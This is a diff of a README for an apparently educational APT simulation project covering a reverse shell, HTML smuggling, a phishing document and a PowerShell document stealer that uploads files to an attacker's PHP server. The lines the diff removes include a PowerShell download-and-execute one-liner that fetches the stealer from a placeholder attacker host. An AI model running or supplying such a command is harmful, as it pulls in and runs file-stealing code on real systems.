@@ -22,7 +22,7 @@ This project simulates an **Advanced Persistent Threat (APT)** attack, covering 
 
 ### **4. Data Exfiltration (Document Theft)**
 
-- A **PowerShell document stealer** searches for sensitive files (**.txt, .pdf, .xlsx, .csv**).
+- A **PowerShell document stealer** (docs-stealer.ps1) searches for sensitive files (**.txt, .pdf, .xlsx, .csv**) etc.
 - Stolen files are uploaded to a **remote PHP web server** controlled by the attacker.
 
 ## **Components**
@@ -31,7 +31,7 @@ This project simulates an **Advanced Persistent Threat (APT)** attack, covering 
 - **Reverse Shell (C & Windows API)**: Establishes attacker connection.
 - **PowerShell Scripts**: Handles persistence & document exfiltration.
 - **PHP Web Server**: Receives stolen files.
-- **HTML Smuggling (HTML & JavaScript)**: Bypasses browser security controls.
+- **HTML Smuggling (HTML & JavaScript)**: dropper delivery.
 - **Phishing Document (DOCX)**: Social engineering bait.
 
 ## **How to Set Up the Simulation**
@@ -62,7 +62,3 @@ php -S 0.0.0.0:8080 -t /path/to/upload_server/
 This project is strictly for **educational purposes**. Unauthorized use of these techniques on real systems **without permission** is illegal and may result in serious legal consequences. Use this simulation in a controlled and isolated environment only.
 
 ---
-
-Let me know if you need **further refinements or additional details!** 🔥
-
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://attacker_ip/docs-stealer.ps1')"
